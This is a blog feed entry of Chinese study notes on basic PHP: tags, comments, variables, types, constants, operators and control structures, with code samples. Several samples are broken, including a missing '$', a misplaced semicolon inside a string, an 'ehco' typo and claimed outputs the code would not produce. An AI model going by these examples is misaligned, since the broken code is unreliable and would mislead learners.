    </entry>
    
    <entry>
      <title><![CDATA[《细说PHP》学习笔记]]></title>
      <url>http://uknowsec.cn/posts/notes/%E3%80%8A%E7%BB%86%E8%AF%B4PHP%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/t01db525962d3cb177e.jpg" alt="php"></p>
<h1 id="PHP的基本语法"><a href="#PHP的基本语法" class="headerlink" title="PHP的基本语法"></a>PHP的基本语法</h1><h2 id="PHP第一个程序"><a href="#PHP第一个程序" class="headerlink" title="PHP第一个程序"></a>PHP第一个程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">	&lt;head&gt;</div><div class="line">		&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;</div><div class="line">		&lt;title&gt;获取服务器信息的第一个PHP程序&lt;/title&gt;	</div><div class="line">	&lt;/head&gt;	</div><div class="line">	&lt;body&gt;			</div><div class="line">&lt;?php		</div><div class="line">	$sysos = $_SERVER[&quot;SERVER_SOFTWARE&quot;];	     //获取服务器标识的字串</div><div class="line">	$sysversion = PHP_VERSION;                   //获取PHP服务器版本	</div><div class="line"></div><div class="line">	//以下两条代码连接MySQL数据库并获取MySQL数据库版本信息</div><div class="line">	mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;); 	</div><div class="line">	$mysqlinfo = mysql_get_server_info();	</div><div class="line"></div><div class="line">	//从服务器中获取GD库的信息</div><div class="line">	if(function_exists(&quot;gd_info&quot;))&#123;                   </div><div class="line">		$gd = gd_info();</div><div class="line">		$gdinfo = $gd[&apos;GD Version&apos;];</div><div class="line">	&#125;else &#123;</div><div class="line">		$gdinfo = &quot;未知&quot;;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">        //从GD库中查看是否支持FreeType字体</div><div class="line">	$freetype = $gd[&quot;FreeType Support&quot;] ? &quot;支持&quot; : &quot;不支持&quot;;  </div><div class="line">	</div><div class="line">	//从PHP配置文件中获得是否可以远程文件获取</div><div class="line">	$allowurl= ini_get(&quot;allow_url_fopen&quot;) ? &quot;支持&quot; : &quot;不支持&quot;;</div><div class="line">	</div><div class="line">	//从PHP配置文件中获得最大上传限制</div><div class="line">	$max_upload = ini_get(&quot;file_uploads&quot;) ? ini_get(&quot;upload_max_filesize&quot;) : &quot;Disabled&quot;;</div><div class="line">	</div><div class="line">	//从PHP配置文件中获得脚本的最大执行时间</div><div class="line">	$max_ex_time= ini_get(&quot;max_execution_time&quot;).&quot;秒&quot;;</div><div class="line"></div><div class="line">	//以下两条获取服务器时间，中国大陆采用的是东八区的时间,设置时区写成Etc/GMT-8</div><div class="line">	date_default_timezone_set(&quot;Etc/GMT-8&quot;);</div><div class="line">	$systemtime = date(&quot;Y-m-d H:i:s&quot;,time());</div><div class="line">	</div><div class="line">	/*  *******************************************************************  */	</div><div class="line">	/*   以HTML表格的形式将以上获取到的服务器信息输出给客户端浏览器          */	</div><div class="line">	/*  *******************************************************************  */	</div><div class="line">	echo &quot;&lt;table align=center cellspacing=0 cellpadding=0&gt;&quot;;</div><div class="line">	echo &quot;&lt;caption&gt; &lt;h2&gt; 系统信息  &lt;/h2&gt; &lt;/caption&gt;&quot;;</div><div class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; Web服务器：    &lt;/td&gt; &lt;td&gt; $sysos        &lt;/td&gt; &lt;/tr&gt;&quot;;</div><div class="line">        echo &quot;&lt;tr&gt; &lt;td&gt; PHP版本：      &lt;/td&gt; &lt;td&gt; $sysversion   &lt;/td&gt; &lt;/tr&gt;&quot;;</div><div class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; MySQL版本：    &lt;/td&gt; &lt;td&gt; $mysqlinfo    &lt;/td&gt; &lt;/tr&gt;&quot;;</div><div class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; GD库版本：     &lt;/td&gt; &lt;td&gt; $gdinfo       &lt;/td&gt; &lt;/tr&gt;&quot;;</div><div class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; FreeType：     &lt;/td&gt; &lt;td&gt; $freetype     &lt;/td&gt; &lt;/tr&gt;&quot;;</div><div class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; 远程文件获取： &lt;/td&gt; &lt;td&gt; $allowurl     &lt;/td&gt; &lt;/tr&gt;&quot;;</div><div class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; 最大上传限制： &lt;/td&gt; &lt;td&gt; $max_upload   &lt;/td&gt; &lt;/tr&gt;&quot;;</div><div class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; 最大执行时间： &lt;/td&gt; &lt;td&gt; $max_ex_time  &lt;/td&gt; &lt;/tr&gt;&quot;;</div><div class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; 服务器时间：   &lt;/td&gt; &lt;td&gt; $systemtime   &lt;/td&gt; &lt;/tr&gt;&quot;;</div><div class="line">	echo &quot;&lt;/table&gt;&quot;;</div><div class="line">?&gt;</div><div class="line">	&lt;body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h3 id="PHP语言标记"><a href="#PHP语言标记" class="headerlink" title="PHP语言标记"></a>PHP语言标记</h3><h4 id="PHP语言嵌入HTML中的位置"><a href="#PHP语言嵌入HTML中的位置" class="headerlink" title="PHP语言嵌入HTML中的位置"></a>PHP语言嵌入HTML中的位置</h4><p>可以将PHP嵌入到以后缀名为.php的HTML文件中的任何地方，只要在文件中使用&lt;?php起始和终止标识符？&gt;就会开启PHP模式</p>
<h4 id="使用四对不同的开始和结束标记"><a href="#使用四对不同的开始和结束标记" class="headerlink" title="使用四对不同的开始和结束标记"></a>使用四对不同的开始和结束标记</h4><ul>
<li>1.xml风格（标准风格推荐使用）    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">echo&quot;这是xml风格的标记&quot;; </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>xml风格的标记是常用的标记，也是推荐使用的标记，服务器不能禁用，该风格的标记在xml，xhtml中都可以使用。</p>
<ul>
<li><p>2.脚本风格</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script languange=&quot;php&quot;&gt; </div><div class="line">echo&apos;这是脚本风格的标记&apos;; </div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>3.简短风格</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?这是简短风格的标记;?&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>注：需要在php.ini中设置short _open_tag=on，默认是on,或者在 PHP 编译时加入了 Cenable-short-tags 选项。(PHP 3版本还可以通过 short_tags() 函数激活使用短标记。)</p>
<ul>
<li>4.asp风格<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;% </div><div class="line">echo&apos;这是asp风格的标记&apos;; </div><div class="line">%&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>注：需要在 php.ini 配置文件中开启 asp_tags = on;<br>上面asp风格与简短风格需要在php.ini中设置下。默认是不支持的。</p>
<h3 id="指令分隔符-“分号”"><a href="#指令分隔符-“分号”" class="headerlink" title="指令分隔符 “分号”"></a>指令分隔符 “分号”</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	echo &quot;This is a test&quot;;</div><div class="line">?&gt;   //这是一个PHP指令，后面一定要加上分号表示结束</div><div class="line"></div><div class="line">&lt;?php echo &quot;This is a test&quot;</div><div class="line">?&gt;  //最后的结束标记?&gt;隐含表示了一个分号，所以这粒可以不用分号结束</div></pre></td></tr></table></figure>
<h3 id="程序注释"><a href="#程序注释" class="headerlink" title="程序注释"></a>程序注释</h3><p>  PHP支持C，C++和Unix shell风格的注释，PHP的注释符号有三种：以“/<em>”和“</em>/”闭合的多行注释符，以及用“//”和“#”开始的单行注释符。注释一定要卸载被注释代码的上面或是右面，不要写到代码的下面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	/*这是一个多行注释</div><div class="line">	可以有多行文字   */</div><div class="line">	</div><div class="line">	echo &quot;this is a test&quot;;</div><div class="line">	echo &quot;this is another test&quot;;    //这是一行C++风格的注释</div><div class="line">	echo &quot;One final test &quot;; 	# 这是Unix Shell风格的注释</div></pre></td></tr></table></figure>
<p>注：多行注释是无法嵌套的，但是在多行注释里可以包含单行注释，在单行注释中也可以包括多行注释。</p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="变量的声明"><a href="#变量的声明" class="headerlink" title="变量的声明"></a>变量的声明</h3><p>在PHP中的声明变量必须是使用“$”后面跟上变量名表示，使用赋值操作符（=）给变量赋值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$a=100;		//声明一个变量a赋上一个整型数据值100；</div><div class="line">	$b=&quot;string&quot;;   //声明一个变量b赋上一个字符串值“string”</div><div class="line">	$c=true;	//声明一个变量c赋上一个布尔数据值</div><div class="line">	$d=99.99;	//声明一个变量d赋上一个浮点型数值</div><div class="line">	</div><div class="line">	$key1=$a;	//声明一个变量key1，将a变量的值赋给它</div><div class="line">	$key2=$b;	//声明一个变量key2，将b变量的值赋给它</div><div class="line">	</div><div class="line">	$a=$b=$c=$d=&quot;value&quot;; 	//同时声明多个变量，并赋上相同的值</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>在变量的使用范围周期内，我们可以通过借助unset()函数释放指定的变量，用isset()函数检测变量是否设置和使用empty()函数检查一个变量是否为空。</p>
<h3 id="变量的命名"><a href="#变量的命名" class="headerlink" title="变量的命名"></a>变量的命名</h3><p>变量名是严格区分大小写的，相同单词组成的变量，但大小写不同就是不同变量。<br>一个有效的变量名由字母或者下划线开头，后面跟上任意数量的字母，数字，或者下划线。<br>正则表达式为：‘[a-zA-Z<em>\x7f-\xff][a-zA-Z0-9</em>\x7f-\xff]*’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$name=&quot;a&quot;;</div><div class="line">	$Name=&quot;b&quot;;</div><div class="line">	$NAME=&quot;c&quot;;</div><div class="line">	</div><div class="line">	echo name;		//输出 a</div><div class="line">	echo Name;		//输出 b</div><div class="line">	echo NAME; 	 	//输出 c</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h3><p>一个变量的变量名可以动态地设置和使用，一个普通的变量通过声明来设置，而一个可变变量获取一个普通变量的值作为这个可变变量的变量名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$hi=&quot;hello;&quot;		//声明一个普通的变量$hi值为“hello”</div><div class="line">	$$hi=&quot;world;&quot;   //声明一个可变变量$$hi,$hi的值为hello，相当于声明$hello的值是“world”</div><div class="line">	</div><div class="line">	ehco &quot;$hi $hello&quot;;  //输出 hello world</div><div class="line">	echo &quot;$hi $&#123;$hi&#125;&quot;;	//同上</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="变量的引用赋值"><a href="#变量的引用赋值" class="headerlink" title="变量的引用赋值"></a>变量的引用赋值</h3><p>新的变量简单的引用了原始变量，改动新的变量将影响到原始变量，反之亦然。使用引用复制，简单地将一个“&amp;”符号加到将要赋值的变量前。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$foo=&apos;Bob&apos;;</div><div class="line">	$bar=&amp;$foo;</div><div class="line">	</div><div class="line">	$bar=&apos;a&apos;;</div><div class="line">	echo $bar;     //a</div><div class="line">	echo $foo;		//a</div><div class="line">	</div><div class="line">	$foo=&apos;b&apos;;</div><div class="line">	echo $bar;   //b</div><div class="line">	echo $foo;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h2 id="变量的类型"><a href="#变量的类型" class="headerlink" title="变量的类型"></a>变量的类型</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170115191035.jpg" alt=""><br>可以使用函数var_dump()查看某表达式的值和类型。</p>
<h3 id="布尔型（boolean）"><a href="#布尔型（boolean）" class="headerlink" title="布尔型（boolean）"></a>布尔型（boolean）</h3><p>以下值被认为是FALSE，所有其他值都被认为是TRUE（包括任何资源）。</p>
<ul>
<li>布尔值FALSE</li>
<li>整型值0为假，-1和其他非零值一样，被认为TRUE</li>
<li>浮点型值0.0</li>
<li>空白字符串和字符串“0”</li>
<li>没有成员变量的数组</li>
<li>没有单元的对象（仅适用与PHP4）</li>
<li>特殊类型NULL（包括尚未设定的变量）</li>
</ul>
<h3 id="整型（integer）"><a href="#整型（integer）" class="headerlink" title="整型（integer）"></a>整型（integer）</h3><p>整数数值有最大的使用范围，整型数的字长和平台有关，如果给定的一个数超出了integer的这个范围，将会被解释为float。同时如果执行的运算结果超出了integer这个范围，也会返回float.</p>
<h3 id="浮点型（float）"><a href="#浮点型（float）" class="headerlink" title="浮点型（float）"></a>浮点型（float）</h3><p>浮点数的字长也是和平台相关，允许表示范围在1.7E-308-1.7E+38之间，精确到小数点后15位。不要比较两个浮点数是否相等。如果确实需要更高的精度，应该是使用任意精度数学函数或者gmp()函数。</p>
<h3 id="字符串（string）"><a href="#字符串（string）" class="headerlink" title="字符串（string）"></a>字符串（string）</h3><p>字符串可以使用单引号、双引号、界定符三种字面上的方法定义。</p>
<ul>
<li>1.单引号：指定一个简单字符串的最简单的方法就是用单引号括起来。</li>
<li>2.双引号：更多的特殊字符的转义，可以解析双引号里面的包含变量。</li>
<li>3.界定符（&lt;&lt;&lt;）：在&lt;&lt;&lt;之后提供一个标识符开始，然后是包含的字符串，最后是同样的标识符结束。结束标识符必须从行的第一列开始，并且后面除了分号以外不能包含任何其他的字符，空格以及空白制表符都不可以。</li>
</ul>
<h3 id="数组（array）"><a href="#数组（array）" class="headerlink" title="数组（array）"></a>数组（array）</h3><p>用array()语言结构来新建一个array,它接受一定数量用逗号分隔的key=&gt;value参数对。<br>key 可以是integer或者string value可以是任何值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$arr=array(&quot;foo&quot;=&gt;&quot;bar&quot;,12=&gt;true);   </div><div class="line">	print_r($arr);		//使用print_r()函数查看数组中的全部内容</div><div class="line">	echo $arr[&quot;foo&quot;];	//通过数组下标访问数组中的单个数据</div><div class="line">	echo $arr[12];		</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="对象（object）"><a href="#对象（object）" class="headerlink" title="对象（object）"></a>对象（object）</h3><p>一个对象类型的变量，是由一组属性值和一组方法构成的。要初始化一个对象，用new语句将对象实例到一个变量中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class Person&#123;</div><div class="line">	var $name;</div><div class="line">	</div><div class="line">	function say()&#123;</div><div class="line">		echo &quot;Doing foo&quot;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	$p=new Person;</div><div class="line">	</div><div class="line">	$p-&gt;name=&quot;Tom&quot;;</div><div class="line">	$p-&gt;say();</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="NULL类型"><a href="#NULL类型" class="headerlink" title="NULL类型"></a>NULL类型</h3><p>特殊的NULL值表示一个变量没有值，NULL类型唯一可能的值就是NULL。NULL不表示空格，也不表示零，也不是空字符串，而是表示一个变量的值为空。NULL不区分大小写，在下列情况下一个变量被认为是NULL：</p>
<ul>
<li>将变量直接赋值为NULL</li>
<li>声明的变量尚未被赋值</li>
<li>被unset()函数销毁的变量</li>
</ul>
<h3 id="伪类型介绍"><a href="#伪类型介绍" class="headerlink" title="伪类型介绍"></a>伪类型介绍</h3><ul>
<li>mixed:说明一个参数可以接受多种不同的类型。</li>
<li>number:说明一个参数可以是intger或者是float</li>
<li>callback:</li>
</ul>
<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><h3 id="常量的定义和使用"><a href="#常量的定义和使用" class="headerlink" title="常量的定义和使用"></a>常量的定义和使用</h3><p>在PHP中是通过使用defin()函数来定义常量的。大小写敏感.遵循PHP标识符的命名规则。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	define(&quot;name&quot;，value)</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h3><p>PHP预定于了一系列常量，可以在程序中直接使用来完成一些特殊的功能。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"> echo &apos;PHP常用的预定义常量&apos;.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line"> </div><div class="line"> echo &apos;当前php的版本为(PHP_VERSION):&apos;.PHP_VERSION.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;当前所使用的操作系统类型(PHP_OS):&apos;.PHP_OS.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;web服务器与PHP之间的接口为(PHP_SAPI):&apos;.PHP_SAPI.&apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;最大的整型数(PHP_INT_MAX):&apos;.PHP_INT_MAX.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;php默认的包含路径(DEFAULT_INCLUDE_PATH):&apos;.DEFAULT_INCLUDE_PATH.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;pear的安装路径(PEAR_INSTALL_DIR):&apos;.PEAR_INSTALL_DIR.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;pear的扩展路径(PEAR_EXTENSION_DIR):&apos;.PEAR_EXTENSION_DIR.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;php的执行路径(PHP_BINDIR):&apos;.PHP_BINDIR.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;php扩展模块的路径为(PHP_LIBDIR):&apos;.PHP_LIBDIR.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;指向最近的错误处(E_ERROR):&apos;.E_ERROR.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;指向最近的警告处(E_WARNING):&apos;.E_WARNING.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;指向最近的注意处(E_NOTICE):&apos;.E_NOTICE.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;自然对数e值(M_E):&apos;.M_E.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;数学上的圆周率的值(M_PI):&apos;.M_PI.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line"> echo &apos;逻辑真值(TRUE):&apos;.TRUE.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;逻辑假值(FALSE):&apos;.FALSE.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;当前文件行数(__LINE__):&apos;.__LINE__.&apos;&lt;br&gt;&lt;br&gt;&apos;; //是两个下划线</div><div class="line">  </div><div class="line"> echo &apos;当前文件路径名(__FILE__):&apos;.__FILE__.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line"> </div><div class="line"> echo &apos;&lt;br&gt;&apos;.&apos;当前被调用的函数名(__FUNCTION__):&apos;.__FUNCTION__.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;类名(__CLASS__):&apos;.__CLASS__.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">  </div><div class="line"> echo &apos;类的方法名(__METHOD__):&apos;.__METHOD__.&apos;&lt;br&gt;&lt;br&gt;&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h2 id="PHP中的运算符"><a href="#PHP中的运算符" class="headerlink" title="PHP中的运算符"></a>PHP中的运算符</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul>
<li>算术运算符</li>
<li>字符串运算符</li>
<li>赋值运算符</li>
<li>比较运算符</li>
<li>逻辑运算符</li>
<li>位运算符</li>
<li>其他运算符</li>
</ul>
<h4 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h4><p>在PHP中字符串运算符只有一个，是英文的句号（“.”），也叫做连接运算符</p>
<h4 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h4><ul>
<li>三元运算符（?:）提供简单的逻辑判断</li>
<li>执行判断符（``）执行操作系统命令，并将其输出信息返回</li>
<li>错误控制运算符（@）当将其放置在一个PHP表达式之前，该表达式可能产生的任何警告信息都会被忽略。</li>
</ul>
<h1 id="PHP语言结构"><a href="#PHP语言结构" class="headerlink" title="PHP语言结构"></a>PHP语言结构</h1><h2 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h2><p>在程序中使用分支结构可以有以下几种形式：</p>
<ul>
<li>单一条件分支结构</li>
<li>双向条件分支结构</li>
<li>多向条件分支结构</li>
<li>巢状条件分支结构</li>
</ul>
<h3 id="单一条件分支结构（if）"><a href="#单一条件分支结构（if）" class="headerlink" title="单一条件分支结构（if）"></a>单一条件分支结构（if）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if(表达式)</div><div class="line">	语句块;</div></pre></td></tr></table></figure>
<h3 id="双向条件分支结构（else子句）"><a href="#双向条件分支结构（else子句）" class="headerlink" title="双向条件分支结构（else子句）"></a>双向条件分支结构（else子句）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if(表达式)</div><div class="line">	语句块1;</div><div class="line">else</div><div class="line">	语句块2;</div></pre></td></tr></table></figure>
<h3 id="多向条件分支结构（elseif子句）"><a href="#多向条件分支结构（elseif子句）" class="headerlink" title="多向条件分支结构（elseif子句）"></a>多向条件分支结构（elseif子句）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">if(表达式1)</div><div class="line">	语句块1;</div><div class="line">elseif(表达式2)</div><div class="line">	语句块2;</div><div class="line">	</div><div class="line">......</div><div class="line"></div><div class="line">elseif(表达式n)</div><div class="line">	语句块n;</div><div class="line">else </div><div class="line">	语句块n+1</div></pre></td></tr></table></figure>
<h3 id="多向条件分支结构（switch语句）"><a href="#多向条件分支结构（switch语句）" class="headerlink" title="多向条件分支结构（switch语句）"></a>多向条件分支结构（switch语句）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">switch(表达式)</div><div class="line">&#123;</div><div class="line">	case 值1：</div><div class="line">		语句块1;</div><div class="line">		break;</div><div class="line">	case 值2;</div><div class="line">		语句块2;</div><div class="line">	</div><div class="line">	.....</div><div class="line">	</div><div class="line">	case 值n;</div><div class="line">		语句块n;</div><div class="line">		break;</div><div class="line">	default:</div><div class="line">		语句块n+1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="巢状条件分支结构"><a href="#巢状条件分支结构" class="headerlink" title="巢状条件分支结构"></a>巢状条件分支结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">if(表达式1)&#123;</div><div class="line">	if(表达式2)&#123;</div><div class="line">	... ...</div><div class="line">	&#125;else&#123;</div><div class="line">	... ...</div><div class="line">	&#125;</div><div class="line">&#125;else&#123;</div><div class="line">	if(表达式2)&#123;</div><div class="line">	... ...</div><div class="line">	&#125;else&#123;</div><div class="line">	... ...</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><p>PHP中提供三种循环</p>
<ul>
<li>while循环</li>
<li>do-while循环</li>
<li>for循环</li>
</ul>
<h3 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">while(表达式)</div><div class="line">	语句块;</div></pre></td></tr></table></figure>
